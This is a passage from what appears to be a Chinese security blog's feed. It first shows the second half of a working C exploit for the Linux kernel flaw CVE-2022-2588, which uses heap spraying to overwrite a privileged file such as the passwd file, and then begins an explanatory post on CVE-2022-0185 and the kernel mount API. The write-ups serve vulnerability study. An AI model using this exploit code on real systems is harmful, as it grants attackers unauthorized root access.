class="number">0</span>);</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">0x100</span>] = &#123;&#125;;</span><br><span class="line">        <span class="comment">// check if user in the passwd</span></span><br><span class="line">        read(xx, buf, <span class="number">0x30</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(buf, <span class="string">&quot;user&quot;</span>, <span class="number">4</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            write(pipe_main[<span class="number">1</span>], <span class="string">&quot;\x00&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;not successful : %s\n&quot;</span>, buf);</span><br><span class="line">            write(pipe_main[<span class="number">1</span>], <span class="string">&quot;\xff&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">post_exploit</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this poc assume we have a heap address leaked</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run_exp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_parent) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;fail to create pipes\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_child) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;fail to create pipes\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_defrag) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;fail to create pipes\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_file_spray[<span class="number">0</span>]) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;fail to create pipes\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_file_spray[<span class="number">1</span>]) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;fail to create pipes\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// thread for spraying file we want to overwrite</span></span><br><span class="line">        adjust_rlimit();</span><br><span class="line">        <span class="keyword">int</span> spray_num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (read(pipe_file_spray[<span class="number">0</span>][<span class="number">0</span>], &amp;spray_num, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)) &lt; <span class="keyword">sizeof</span>(<span class="keyword">int</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            err(<span class="number">1</span>, <span class="string">&quot;read file spray&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;got cmd, start spraying %s\n&quot;</span>, target);</span><br><span class="line">        spray_num = <span class="number">4096</span>;</span><br><span class="line">        <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                pin_on_cpu(i % cpu_cores);</span><br><span class="line">                open(target, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                sleep(<span class="number">10000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            pin_on_cpu(i % cpu_cores);</span><br><span class="line">            open(target, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;spray done\n&quot;</span>);</span><br><span class="line">        write(pipe_file_spray[<span class="number">1</span>][<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sleep(<span class="number">10000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        pin_on_cpu(<span class="number">0</span>);</span><br><span class="line">        pre_exploit();</span><br><span class="line">        exploit();</span><br><span class="line">        post_exploit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// do the defragmentation to exhaust all file slabs</span></span><br><span class="line">            <span class="comment">// for cross cache</span></span><br><span class="line">            adjust_rlimit();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                pin_on_cpu(i % cpu_cores);</span><br><span class="line">                open(target, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;defrag done\n&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (write(pipe_defrag[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;failed write defrag&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// memory spray thread</span></span><br><span class="line">            setup_namespace();</span><br><span class="line">            pin_on_cpu(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">int</span> sprayfd = socket(PF_NETLINK, SOCK_RAW, <span class="number">0</span>);</span><br><span class="line">            assert(sprayfd != <span class="number">-1</span>);</span><br><span class="line">            add_qdisc(sprayfd);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">char</span> msg[<span class="number">0x10</span>] = &#123;&#125;;</span><br><span class="line">            <span class="keyword">char</span> payload[<span class="number">256</span>] = &#123;&#125;;</span><br><span class="line">            <span class="built_in">memset</span>(payload + <span class="number">0x10</span>, <span class="string">&#x27;A&#x27;</span>, <span class="number">256</span> - <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (read(pipe_defrag[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;failed read defrag&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// if the exploit keeps failing, please tune the middle and end</span></span><br><span class="line">            <span class="keyword">int</span> middle = <span class="number">38</span>;</span><br><span class="line">            <span class="keyword">int</span> end = middle + <span class="number">40</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// preparing for cross cache</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; middle; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                add_tc_basic(sprayfd, i + <span class="number">1</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            add_tc_basic(sprayfd, middle + <span class="number">1</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">            add_tc_basic(sprayfd, middle + <span class="number">2</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">            add_tc_basic(sprayfd, middle + <span class="number">3</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">            <span class="keyword">if</span> (write(pipe_child[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;write to parent\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// allocate route4</span></span><br><span class="line">            <span class="keyword">if</span> (read(pipe_parent[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;read from parent&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// add_tc_basic(sprayfd, middle+2, payload, 129, 32);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// prepare another part for cross cache</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = middle + <span class="number">2</span>; i &lt; end; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                add_tc_basic(sprayfd, i + <span class="number">1</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;spray 256 done\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; end - <span class="number">24</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// prevent double free of 192</span></span><br><span class="line">                <span class="comment">// and being reclaimed by others</span></span><br><span class="line">                <span class="keyword">if</span> (i == middle || i == middle + <span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                delete_tc_basic(sprayfd, i + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (write(pipe_child[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;write to parent\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// free route4 here</span></span><br><span class="line">            <span class="keyword">if</span> (read(pipe_parent[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;read from parent&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// if (cpu_cores == 1) sleep(1);</span></span><br><span class="line">            delete_tc_basic(sprayfd, middle + <span class="number">2</span>);</span><br><span class="line">            delete_tc_basic(sprayfd, middle + <span class="number">3</span>);</span><br><span class="line">            delete_tc_basic(sprayfd, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = middle + <span class="number">2</span>; i &lt; end; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                delete_tc_basic(sprayfd, i + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;256 freed done\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (write(pipe_child[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;write to parent\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    global = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE | PROT_EXEC,</span><br><span class="line">                          MAP_SHARED | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(global, <span class="number">0</span>, <span class="number">0x2000</span>);</span><br><span class="line"></span><br><span class="line">    self_path = global;</span><br><span class="line">    <span class="built_in">snprintf</span>(self_path, <span class="number">0x100</span>, <span class="string">&quot;%s/%s&quot;</span>, get_current_dir_name(), argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;self path %s\n&quot;</span>, self_path);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(target, <span class="number">0</span>);</span><br><span class="line">    content = (<span class="keyword">char</span> *)(global + <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(content, overwrite);</span><br><span class="line">    read(fd, content + <span class="built_in">strlen</span>(overwrite), <span class="number">0x1000</span>);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    assert(pipe(pipe_main) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prepare done\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        run_exp();</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sleep(<span class="number">10000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> data;</span><br><span class="line">    read(pipe_main[<span class="number">0</span>], &amp;data, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (data == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;succeed\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>参考链接：</p><p>​<a class="link"   href="https://github.com/Markakd/CVE-2022-2588" >https://github.com/Markakd/CVE-2022-2588<i class="fas fa-external-link-alt"></i></a></p><p>​<a class="link"   href="https://paper.seebug.org/2019/" >https://paper.seebug.org/2019/<i class="fas fa-external-link-alt"></i></a></p><p>​<a class="link"   href="https://elixir.bootlin.com/linux/v5.14/source" >https://elixir.bootlin.com/linux/v5.14/source<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本来不想分析CVE了，无奈前面提到了内核内部隔离机制，而在往期的文章中只在&lt;a class=&quot;link&quot;   href=&quot;https://c</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://196082.github.io/categories/Linux-Kernel/"/>
    
    <category term="CVE复现" scheme="https://196082.github.io/categories/Linux-Kernel/CVE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Rtnetlink" scheme="https://196082.github.io/tags/Rtnetlink/"/>
    
    <category term="Dirty Cred" scheme="https://196082.github.io/tags/Dirty-Cred/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-0185复现</title>
    <link href="https://196082.github.io/2023/10/15/CVE-2022-0185/"/>
    <id>https://196082.github.io/2023/10/15/CVE-2022-0185/</id>
    <published>2023-10-15T09:03:20.000Z</published>
    <updated>2023-11-29T10:11:19.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>其实并不是很想复现这个洞，但是在前些天fmyy告诉了我一个利用方式<code>fuse</code>，虽然他也给我推荐了对应的CVE，不过我更加愿意看墨晚鸢佬的博客。这个CVE复现结束之后应该会有很长一段时间不会继续复现CVE了，后续的打算是更多的学习<code>kernel fuzz</code>。</p><p><a class="link"   href="https://www.willsroot.io/2022/01/cve-2022-0185.html" >https://www.willsroot.io/2022/01/cve-2022-0185.html<i class="fas fa-external-link-alt"></i></a> 这里是这个CVE发现者的文章，里面提到了其是被<code>syzkaller</code>给fuzz出来的。</p><h2 id="Filesystem-mount-API-分析"><a href="#Filesystem-mount-API-分析" class="headerlink" title="Filesystem mount API 分析"></a>Filesystem mount API 分析</h2><p>在Linux下的文件系统的挂载，<code>mount</code> 系统调用被用以将文件系统挂载到以 <code>/</code> 为根节点的文件树上，例如我们可以用如下命令挂载硬盘 <code>/dev/sdb1</code> 到 <code>/mnt/temp</code> 目录下，之后就能在该目录下进行文件访问：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount /dev/sdb1 /mnt/temp</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mount.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Usage: moount &#123;dev_path&#125; &#123;mount_point&#125; &#123;fs_type&#125;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mount(argv[<span class="number">1</span>], argv[<span class="number">2</span>], argv[<span class="number">3</span>], <span class="number">0</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] Failed to mount %s at %s by file system type: %s!\n&quot;</span>, </span><br><span class="line">              argv[<span class="number">1</span>], argv[<span class="number">2</span>], argv[<span class="number">3</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Successful to mount %s at %s by file system type: %s.\n&quot;</span>, </span><br><span class="line">              argv[<span class="number">1</span>], argv[<span class="number">2</span>], argv[<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然而新的<code>mount API</code>将上面的一个简单的<code>mount</code>系统调用的功能拆分成了多个新的系统调用，多个系统调用分别对应了不同文件系统挂载阶段。</p><h3 id="fsopen"><a href="#fsopen" class="headerlink" title="fsopen"></a>fsopen</h3><p>在Linux中一直秉持着一切皆文件的思想，在新的<code>mount API</code>中也有对应的映照，首先则是<code>fsopen</code>就类似于<code>open</code>系统调用，其用于打开一个文件系统，并返回一个文件系统描述符(称为文件系统上下文)。</p><p>由于标准库中还未添加其相关代码，因此需要手写<code>raw syscall</code>来进行相关的系统调用，例如我们可以使用如下代码打开一个空白的 <code>ext4</code> 文件系统上下文（需要 <code>CAP_SYS_ADMIN</code> 权限，或是开启了 <code>unprivileged namespace</code> 的情况下使用 <code>unshare()</code> 系统调用创建带有该权限的 <code>namespace</code>）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsopen</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsopen 430</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fs_name, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsopen, fs_name, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fs_fd;</span><br><span class="line">    </span><br><span class="line">    fs_fd = fsopen(<span class="string">&quot;ext4&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fs_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] FAILED to fsopen!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里创建的是一个空白的文件系统上下文，并没有与任何的实际设备进行关联。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE2(fsopen, <span class="keyword">const</span> <span class="keyword">char</span> __user *, _fs_name, <span class="keyword">unsigned</span> <span class="keyword">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span> *<span class="title">fs_type</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_context</span> *<span class="title">fc</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *fs_name;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ns_capable(current-&gt;nsproxy-&gt;mnt_ns-&gt;user_ns, CAP_SYS_ADMIN))</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; ~FSOPEN_CLOEXEC)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">fs_name = strndup_user(_fs_name, PAGE_SIZE);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(fs_name))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(fs_name);</span><br><span class="line"></span><br><span class="line">fs_type = get_fs_type(fs_name);</span><br><span class="line">kfree(fs_name);</span><br><span class="line"><span class="keyword">if</span> (!fs_type)</span><br><span class="line"><span class="keyword">return</span> -ENODEV;</span><br><span class="line"></span><br><span class="line">fc = fs_context_for_mount(fs_type, <span class="number">0</span>);</span><br><span class="line">put_filesystem(fs_type);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(fc))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(fc);</span><br><span class="line"></span><br><span class="line">fc-&gt;phase = FS_CONTEXT_CREATE_PARAMS;</span><br><span class="line"></span><br><span class="line">ret = fscontext_alloc_log(fc);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_fc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> fscontext_create_fd(fc, flags &amp; FSOPEN_CLOEXEC ? O_CLOEXEC : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">err_fc:</span><br><span class="line">put_fs_context(fc);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在内核中调用<code>fsopen</code>的会进入到如上函数，最终会在<code>fscontext_create_fd</code>函数创建一个<code>file</code>结构体，并且返回文件描述符。</p><p><code>fscontext_alloc_log</code>通过名字可以看出来这里分配的是用于<code>log</code>的内存。</p><p><code>fs_context_for_mount</code>这个函数的返回值的类型为<code>fs_context</code>，其作用也就是创建一个文件系统上下文结构体。</p><p><code>strndup_user</code>函数则是获取用户态传入的文件系统名，<code>get_fs_type</code>这里是获取其<code>type</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Filesystem context for holding the parameters used in the creation or</span></span><br><span class="line"><span class="comment"> * reconfiguration of a superblock.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Superblock creation fills in -&gt;root whereas reconfiguration begins with this</span></span><br><span class="line"><span class="comment"> * already set.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * See Documentation/filesystems/mount_api.txt</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_context</span> &#123;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">fs_context_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span><span class="title">uapi_mutex</span>;</span><span class="comment">/* Userspace access mutex */</span></span><br><span class="line"><span 